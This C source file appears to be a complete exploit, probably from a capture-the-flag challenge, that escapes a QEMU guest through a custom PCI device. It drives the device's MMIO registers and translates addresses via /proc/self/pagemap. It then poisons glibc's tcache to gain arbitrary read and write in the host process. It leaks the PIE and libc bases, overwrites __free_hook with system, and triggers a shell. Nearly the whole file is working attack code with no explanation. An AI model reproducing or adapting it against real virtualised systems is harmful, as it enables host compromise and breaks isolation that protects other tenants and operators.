/* Copyright © 2021 r1v3r
*/
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <inttypes.h>
#include <stdint.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <assert.h>
#include <pthread.h>
void mem_flush(const void *p, unsigned int allocation_size){
    const size_t cache_line = 64;
    const char *cp = (const char *)p;
    size_t i = 0;

    if (p == NULL || allocation_size <= 0)
        return;

    for (i = 0; i < allocation_size; i += cache_line) {
        asm volatile("clflush (%0)\n\t"
                :
                : "r"(&cp[i])
                : "memory");
    }

    asm volatile("sfence\n\t"
            :
            :
            : "memory");
}
void dq(uint64_t* buf, size_t size) {
    size_t i = 0;
    for (; i < size; ++i) {
        printf("%" PRIu64 ": 0x%" PRIx64 "\n", i, buf[i]);
    }
}
void hexdump(unsigned char* buf, size_t size) {
    int i,j;
    for (i = 0;i < size;i += 16)
    {
        printf("%08x:", i);
        for (j = i;j < size && j < i + 16;j++)
        {
            printf(" %02x", buf[j]);
        }
        puts("");
    }
}

void die(const char* msg) {
    perror(msg);
    exit(-1);
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

int fd = -1;

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    uint64_t ret = (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
    printf("[%p] -> [%p]", addr, ret);
    return ret;
}

volatile unsigned char* mmio_mem;
volatile unsigned char* volatile content_mem;
uint64_t content_addr;

void __attribute__ ((noinline)) mmio_write(uint32_t addr, uint32_t val) {
    *((uint32_t*)(mmio_mem + addr)) = val;
}
void set_size(uint32_t val) {
    mmio_write(0, val);
}
void set_addr(uint32_t val) {
    mmio_write(4, val);
}
void set_res_addr(uint32_t val) {
    mmio_write(8, val);
}
void set_idx(uint32_t val) {
    mmio_write(12, val);
}
void set_content(uint32_t idx) {
    set_addr(gva_to_gpa(content_mem + idx*0x400)-idx*0x400);
    set_idx(idx);
    mmio_write(16, 0);
}
void init_buf() {
    mmio_write(20, 0);
}
void free_buf() {
    mmio_write(24, 0);
}
uint32_t __attribute__ ((noinline)) mmio_read(uint32_t addr) {
    return *((uint32_t*)(mmio_mem + addr));
}

volatile int res_buf;

uint32_t get_content(uint32_t idx) {
    set_addr(gva_to_gpa(content_mem + idx*0x400)-idx*0x400);
    set_idx(idx);
    res_buf = 0;
    usleep(1000);
    uint32_t ret = mmio_read(16);
    while (res_buf != 2) {
        mem_flush(&res_buf, 4);
    }
    return ret;
}

volatile int ready = 0;
volatile int freed = -1;

void *do_free_buf(void* args) {
    while (!ready) {};
    free_buf();
    freed = 0;
    volatile int cursize = 0;
    for (;;) {
        cursize = mmio_read(0);
        if (!cursize) {
            freed = 1;
            break;
        }
    }
    return NULL;
}

uint64_t head = 0;

uint64_t arb_dq(uint64_t addr) {
    uint64_t *blk3 = content_mem + 3*0x400;
    // set blk0 ptr
    blk3[1] = addr;
    set_content(3);
    // read out
    get_content(0);
    return *(uint64_t *)content_mem;
}

void arb_eq(uint64_t addr, uint64_t val) {
    // get original buffer
    arb_dq(addr);
    // overwrite first qword
    *(uint64_t *)content_mem = val;
    set_content(0);
}

void arb_ea(uint64_t addr, unsigned char *buf, size_t size) {
    // get original buffer
    arb_dq(addr);
    memcpy(content_mem, buf, size);
    set_content(0);
}

int main(int argc, char *argv[])
{
    pthread_t t1;
    pthread_t t2;
    setbuf(stdout, NULL);
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0)
        die("open");
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("open2");
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap");
    printf("mmio_mem %p\n", mmio_mem);

    content_mem = mmap(0, 128*0x400, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);

    if (content_mem == MAP_FAILED)
        die("mmap2");
    memset(content_mem, 'a', 128*0x400);
    content_addr = gva_to_gpa(content_mem);
    printf("content_addr %lx\n", content_addr);

    set_size(0x400 * 127-1); // get all freed chunks and tcaches
    set_addr(content_addr);
    set_res_addr(gva_to_gpa(&res_buf));
    init_buf();
    mem_flush(content_mem, 0x400*128);
    int i;
    /*
    for (i = 0; i < 20; ++i) {
        get_content(i);
        printf("[%d]\n", i);
        dq(content_mem+i*0x400, 8);
    }
    */

    free_buf(); // fill the tcache
    set_size(0x400*127-1); // get tcache first, then other chunks
    set_addr(content_addr);
    set_res_addr(gva_to_gpa(&res_buf));
    init_buf();
    mem_flush(content_mem, 0x400*128);
    for (i = 0; i < 20; ++i) {
        get_content(i);
        printf("[%d]\n", i);
        mem_flush(content_mem+i*0x400, 0x400);
        dq(content_mem+i*0x400, 8);
    }
    uint64_t *blk2 = content_mem+0x400*2;
    uint64_t blk3_addr = blk2[0];
    uint64_t *blk6 = content_mem+0x400*6;
    if (blk6[2] != blk6[3] || blk6[2] == 0) {
        die("retry");
    }
    head = blk6[0] & ~0xfff;
    uint64_t meta_addr = blk6[2] + 0x10;
    uint64_t *blk3 = (uint64_t*)content_mem+0x400*3;
    mem_flush(blk3, 0x400);
    memset(blk3, '0', 0x400);
    blk3[0] = meta_addr;
    memcpy(blk3, &meta_addr, 8);
    mem_flush(blk3, 0x400);
    // +0x20 is not used in freed chunk, so we can read from blk3 after freed
    // (maybe we can try overwrite arena?)
    // blk 0 - 6 will go to tcache, blk6 is top, we want to get blk6 twice
    printf("tcache top should be %lx\n", meta_addr);

    set_res_addr(0xfebf1000+0x18);
    set_addr(gva_to_gpa(blk3)-3*0x400);
    set_idx(3);
    mmio_write(16, 0);

    // got it
    set_size(0x400*4-1);
    set_res_addr(gva_to_gpa(&res_buf));
    init_buf();
    // blk0 is 0 now
    // mem_flush(content_mem, 0x400*128);
    for (i = 1; i < 4; ++i) {
        get_content(i);
        printf("[%d]\n", i);
        // mem_flush(content_mem+i*0x400, 0x400);
        dq(content_mem+i*0x400, 8);
    }
    // now we can do arb r/w
    volatile uint64_t *blk0 = content_mem;
    printf("head %lx\n", head);
    int j = 0;
    for (i = 0; i < 0x1000; ++i) {
        arb_dq(head+i*0x400);
        for (j = 0; j < 0x400/8; ++j) {
            if (((blk0[j] & 0xfff) == 0xf0b) && blk0[j] > 0x550000000000) {
                puts("found");
                break;
            }
        }
        if (j != 0x400/8)
            break;
    }
    uint64_t pie = blk0[j] - 0xa96f0b;
    printf("pie %lx\n", pie);
    uint64_t ftell_ = arb_dq(pie + 0x100C960);
    printf("ftell %lx\n", ftell_);
    uint64_t libc = ftell_ - 0x86270;
    printf("libc %lx\n", libc);
    arb_eq(libc + 0x1eeb28, libc + 0x55410); // [free_hook] = system
    arb_dq(libc + 0x1b75aa); // make blk0 point to binsh
    free_buf(); // shell
    getchar();
}
